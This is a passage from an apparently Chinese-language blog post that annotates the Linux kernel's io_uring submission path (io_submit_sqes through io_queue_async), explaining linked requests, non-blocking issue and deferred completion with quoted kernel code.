class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">io_sqring_entries</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rings</span> *<span class="title">rings</span> =</span> ctx-&gt;rings;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* make sure SQ entry isn&#x27;t read before tail */</span></span><br><span class="line">entries = smp_load_acquire(&amp;rings-&gt;sq.tail) - ctx-&gt;cached_sq_head;</span><br><span class="line"><span class="keyword">return</span> min(entries, ctx-&gt;sq_entries);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-submit-sqes"><code>io_submit_sqes</code></h4><p>最后是真正的提交请求函数</p><p>计算需要提交的sqes并跟踪状态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_submit_sqes</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">unsigned</span> <span class="type">int</span> nr)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> entries = io_sqring_entries(ctx);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> left;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!entries))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* make sure SQ entry isn&#x27;t read before tail */</span></span><br><span class="line">ret = left = min(nr, entries);</span><br><span class="line">io_get_task_refs(left);</span><br><span class="line">io_submit_state_start(&amp;ctx-&gt;submit_state, left);</span><br></pre></td></tr></table></figure><p>循环处理每个sqes</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">req</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!io_alloc_req(ctx, &amp;req)))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!io_get_sqe(ctx, &amp;sqe))) &#123;</span><br><span class="line">io_req_add_to_cache(req, ctx);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 为每个SQE分配并初始化io_kiocb请求 </span></span><br><span class="line"><span class="keyword">if</span> (unlikely(io_submit_sqe(ctx, req, sqe)) &amp;&amp;</span><br><span class="line"><span class="comment">// 真正的提交</span></span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SUBMIT_ALL)) &#123;</span><br><span class="line">left--;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (--left);</span><br></pre></td></tr></table></figure><h4 id="io-submit-sqe"><code>io_submit_sqe</code></h4><p>这个函数比较关键的是对于同步的处理, 我们知道, <code>io_uring</code>  是异步的, 任务处理的顺序不一定是按照提交的顺序, 但是,  如果 sqe 的 flag字段设置了  <code>IOSQE_IO_LINK</code> , 那么任务就会挂在一条链上, 直到一个任务没有此flag, 而链上的任务的执行是有先后顺序</p><p>同时, 要理解, <code>ctx-&gt;sumit_state.link</code> 是一个循环链表, 由 <code>io_kiocb</code>  组成, 每个 <code>io_kiocb</code>  的link成员指向下一个 <code>io_kiocb</code>  结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">io_submit_sqe</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="keyword">struct</span> io_kiocb *req, <span class="type">const</span> <span class="keyword">struct</span> io_uring_sqe *sqe)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_submit_link</span> *<span class="title">link</span> =</span> &amp;ctx-&gt;submit_state.link;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = io_init_req(ctx, req, sqe);</span><br><span class="line"><span class="comment">// 初始化并校验SQE请求req </span></span><br><span class="line"><span class="keyword">if</span> (unlikely(ret))</span><br><span class="line"><span class="keyword">return</span> io_submit_fail_init(sqe, req, ret);</span><br><span class="line"><span class="comment">// 如果已有链头或者SQE标记了链接标志</span></span><br><span class="line"></span><br><span class="line">trace_io_uring_submit_req(req);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we already have a head request, queue this one for async</span></span><br><span class="line"><span class="comment"> * submittal once the head completes. If we don&#x27;t have a head but</span></span><br><span class="line"><span class="comment"> * IOSQE_IO_LINK is set in the sqe, start a new head. This one will be</span></span><br><span class="line"><span class="comment"> * submitted sync once the chain is complete. If none of those</span></span><br><span class="line"><span class="comment"> * conditions are true (normal request), then just queue it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(link-&gt;head)) &#123;</span><br><span class="line"><span class="comment">// 如果链表已经有了一个head 请求, 意味着之前sqe 有 `IOSQE_IO_LINK` 标志</span></span><br><span class="line">ret = io_req_prep_async(req);</span><br><span class="line"><span class="comment">// 准备异步提交状态</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(ret))</span><br><span class="line"><span class="keyword">return</span> io_submit_fail_init(sqe, req, ret);</span><br><span class="line"></span><br><span class="line">trace_io_uring_link(req, link-&gt;head);</span><br><span class="line">link-&gt;last-&gt;link = req;</span><br><span class="line">link-&gt;last = req;</span><br><span class="line"><span class="comment">// 将本项挂载到链表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 如果此项没有 LINK 标志, 清空 链表</span></span><br><span class="line"><span class="comment">/* last request of the link, flush it */</span></span><br><span class="line">req = link-&gt;head;</span><br><span class="line">link-&gt;head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; (REQ_F_FORCE_ASYNC | REQ_F_FAIL))</span><br><span class="line"><span class="keyword">goto</span> fallback;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(req-&gt;flags &amp; (IO_REQ_LINK_FLAGS |</span><br><span class="line">  REQ_F_FORCE_ASYNC | REQ_F_FAIL))) &#123;</span><br><span class="line"><span class="comment">// 如果之前的任务没有LINK 标记, 但此任务有, 给链表添加一个头</span></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS) &#123;</span><br><span class="line">link-&gt;head = req;</span><br><span class="line">link-&gt;last = req;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fallback:  </span><br><span class="line"><span class="comment">// 加入降级提交fallback队列</span></span><br><span class="line">io_queue_sqe_fallback(req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 加入普通提交队列</span></span><br><span class="line">io_queue_sqe(req);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-queue-sqe-io-issue-sqe-重要"><code>io_queue_sqe</code> | <code>io_issue_sqe</code> | 重要</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">io_queue_sqe</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = io_issue_sqe(req, IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We async punt it if the file wasn&#x27;t marked NOWAIT, or if the file</span></span><br><span class="line"><span class="comment"> * doesn&#x27;t support non-blocking read/write attempts</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (likely(!ret))</span><br><span class="line">io_arm_ltimeout(req);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_queue_async(req, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_issue_sqe</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req, <span class="type">unsigned</span> <span class="type">int</span> issue_flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_issue_def</span> *<span class="title">def</span> =</span> &amp;io_issue_defs[req-&gt;opcode];</span><br><span class="line"><span class="comment">// 根据op_code 查看请求def</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">creds</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!io_assign_file(req, def, issue_flags)))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"><span class="comment">// 为请求分配文件描述符</span></span><br><span class="line"><span class="keyword">if</span> (unlikely((req-&gt;flags &amp; REQ_F_CREDS) &amp;&amp; req-&gt;creds != current_cred()))</span><br><span class="line">creds = override_creds(req-&gt;creds);</span><br><span class="line"><span class="comment">// 备份和恢复请求执行线程的安全凭证</span></span><br><span class="line"><span class="keyword">if</span> (!def-&gt;audit_skip)</span><br><span class="line">audit_uring_entry(req-&gt;opcode);</span><br><span class="line"><span class="comment">// 调用audit跟踪提交事件</span></span><br><span class="line"></span><br><span class="line">ret = def-&gt;issue(req, issue_flags);</span><br><span class="line"><span class="comment">// 调用def-&gt;issue执行请求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!def-&gt;audit_skip)</span><br><span class="line">audit_uring_exit(!ret, ret);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (creds)</span><br><span class="line">revert_creds(creds);</span><br><span class="line"><span class="comment">// 恢复凭证</span></span><br><span class="line"><span class="keyword">if</span> (ret == IOU_OK) &#123;</span><br><span class="line"><span class="keyword">if</span> (issue_flags &amp; IO_URING_F_COMPLETE_DEFER)</span><br><span class="line"><span class="comment">// 如果成功并且标记了延迟完成,注册延迟完成回调</span></span><br><span class="line">io_req_complete_defer(req);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_req_complete_post(req, issue_flags);</span><br><span class="line"><span class="comment">//  否则直接提交完成 </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret != IOU_ISSUE_SKIP_COMPLETE)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If the op doesn&#x27;t have a file, we&#x27;re not polling for it */</span></span><br><span class="line"><span class="keyword">if</span> ((req-&gt;ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp; def-&gt;iopoll_queue)</span><br><span class="line">io_iopoll_req_issued(req, issue_flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-get-sqe-重要"><code>io_get_sqe</code> |  重要</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">io_get_sqe</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">const</span> <span class="keyword">struct</span> io_uring_sqe **sqe)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> mask = ctx-&gt;sq_entries - <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> head = ctx-&gt;cached_sq_head++ &amp; mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) &#123;</span><br><span class="line">head = READ_ONCE(ctx-&gt;sq_array[head]);</span><br><span class="line"><span class="comment">// 如果没有设置NOSQARRAY 直接从array读</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(head &gt;= ctx-&gt;sq_entries)) &#123;</span><br><span class="line"><span class="comment">// 丢弃无效 entries</span></span><br><span class="line">spin_lock(&amp;ctx-&gt;completion_lock);</span><br><span class="line">ctx-&gt;cq_extra--;</span><br><span class="line">spin_unlock(&amp;ctx-&gt;completion_lock);</span><br><span class="line">WRITE_ONCE(ctx-&gt;rings-&gt;sq_dropped,</span><br><span class="line">   READ_ONCE(ctx-&gt;rings-&gt;sq_dropped) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">head &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">*sqe = &amp;ctx-&gt;sq_sqes[head];</span><br><span class="line"><span class="comment">// 从 sq_sqes 取一个sqe </span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="io-submit-sqe-同步与异步的请求执行"><code>io_submit_sqe</code> | 同步与异步的请求执行</h3><p>我们首先回到 <code>io_submit_sqe</code></p><p>我们注意到, 如果存在 LINK 标记, 只是将这个req添加到链上,  而没有 <code>io_queue_sqe</code>.</p><p>如果前一个请求有 LINK 标记, 此时没有, 也只是将请求加入链中后, 清空 head.  此时调用的是 <code>io_queue_sqe(NULL)</code></p><p>综上, 对于link, 并没有直接处理.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(link-&gt;head)) &#123;</span><br><span class="line"><span class="comment">// 如果链表已经有了一个head 请求, 意味着之前sqe 有 `IOSQE_IO_LINK` 标志</span></span><br><span class="line">ret = io_req_prep_async(req);</span><br><span class="line"><span class="comment">// 准备异步提交状态</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(ret))</span><br><span class="line"><span class="keyword">return</span> io_submit_fail_init(sqe, req, ret);</span><br><span class="line"></span><br><span class="line">trace_io_uring_link(req, link-&gt;head);</span><br><span class="line">link-&gt;last-&gt;link = req;</span><br><span class="line">link-&gt;last = req;</span><br><span class="line"><span class="comment">// 将本项挂载到链表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 如果此项没有 LINK 标志, 清空 链表</span></span><br><span class="line"><span class="comment">/* last request of the link, flush it */</span></span><br><span class="line">req = link-&gt;head;</span><br><span class="line">link-&gt;head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; (REQ_F_FORCE_ASYNC | REQ_F_FAIL))</span><br><span class="line"><span class="keyword">goto</span> fallback;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(req-&gt;flags &amp; (IO_REQ_LINK_FLAGS |</span><br><span class="line">  REQ_F_FORCE_ASYNC | REQ_F_FAIL))) &#123;</span><br><span class="line"><span class="comment">// 如果之前的任务没有LINK 标记, 但此任务有, 给链表添加一个头</span></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS) &#123;</span><br><span class="line">link-&gt;head = req;</span><br><span class="line">link-&gt;last = req;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fallback:  </span><br><span class="line"><span class="comment">// 加入降级提交fallback队列</span></span><br><span class="line">io_queue_sqe_fallback(req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 加入普通提交队列</span></span><br><span class="line">io_queue_sqe(req);</span><br></pre></td></tr></table></figure><p>再次重回 <code>io_queue_sqe</code> 函数, 我们发现其在调用  <code>io_issue_sqe</code> 时设置了这样两个标志  <code>IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER</code>, 字面意义上理解, 就是非阻塞与延迟完成.</p><p>首先为什么要非阻塞呢?</p><p>让我们往前回想, 发现, 在 IOPOLL 模式下,  <code>io_uring_enter</code> 也是调用了 <code>io_submit_sqes</code> , 最终也会调用到此函数, 所以如果这个函数阻塞了, IOPOLL模式下, 用户进程实际上也是阻塞的, 也就不符合异步的初衷了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">io_queue_sqe</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = io_issue_sqe(req, IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We async punt it if the file wasn&#x27;t marked NOWAIT, or if the file</span></span><br><span class="line"><span class="comment"> * doesn&#x27;t support non-blocking read/write attempts</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (likely(!ret))</span><br><span class="line">io_arm_ltimeout(req);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_queue_async(req, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来再进入 <code>io_issue_sqe</code> , 其中使用了一个虚表调用处理函数, 并且之前的flag也作为参数传入了.</p><p>而我们知道, 如read, write等很多操作, 都是阻塞的, 不能 <code>NOBLOCK</code>  , 因此, 这个执行只是一个尝试执行, 实际上并没有真正完成请求</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = def-&gt;issue(req, issue_flags);</span><br><span class="line"><span class="comment">// 调用def-&gt;issue执行请求</span></span><br></pre></td></tr></table></figure><p>接下来我们注意到, 在 <code>io_queue_sqe</code> 调用此函数时, 设置了 <code>IO_URING_F_COMPLETE_DEFER</code> 标志</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ret == IOU_OK) &#123;</span><br><span class="line"><span class="keyword">if</span> (issue_flags &amp; IO_URING_F_COMPLETE_DEFER)</span><br><span class="line"><span class="comment">// 如果成功并且标记了延迟完成,注册延迟完成回调</span></span><br><span class="line">io_req_complete_defer(req);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_req_complete_post(req, issue_flags);</span><br><span class="line"><span class="comment">//  否则直接提交完成 </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret != IOU_ISSUE_SKIP_COMPLETE)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br></pre></td></tr></table></figure><p>继续进入 <code>io_req_complete_defer</code>  发现实际上就是将请求插入插入链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">io_req_complete_defer</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_submit_state</span> *<span class="title">state</span> =</span> &amp;req-&gt;ctx-&gt;submit_state;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;req-&gt;ctx-&gt;uring_lock);</span><br><span class="line"></span><br><span class="line">wq_list_add_tail(&amp;req-&gt;comp_list, &amp;state-&gt;compl_reqs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这也没有完成请求.</p><p>那么真正完成请求是在哪? 让我们继续分析</p><h4 id="io-queue-async"><code>io_queue_async</code></h4><p>在 <code>io_issue_sqe</code>  返回后,  <code>io_queue_sqe</code> 继续调用了此函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_queue_async</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req, <span class="type">int</span> ret)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">linked_timeout</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret != -EAGAIN || (req-&gt;flags &amp; REQ_F_NOWAIT)) &#123;</span><br><span class="line">io_req_defer_failed(req, ret);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="comment">// 如果请求是不可等待的必须立马完成的, 就不能推迟</span></span><br><span class="line"></span><br><span class="line">linked_timeout = io_prep_linked_timeout(req);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (io_arm_poll_handler(req, <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="comment">// 这里调用了一个 论询问 handler, 确定 请求的类型</span></span><br><span class="line"><span class="keyword">case</span> IO_APOLL_READY:</span><br><span class="line"><span class="comment">// 如果已经可以完成了</span></span><br><span class="line">io_kbuf_recycle(req, <span class="number">0</span>);</span><br><span class="line">io_req_task_queue(req);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IO_APOLL_ABORTED:</span><br><span class="line"><span class="comment">// 如果终止了</span></span><br><span class="line">io_kbuf_recycle(req, <span class="number">0</span>);</span><br><span class="line">io_queue_iowq(req, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IO_APOLL_OK:</span><br><span class="line"><span class="comment">// 如果已经完成了</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (linked_timeout)</span><br><span 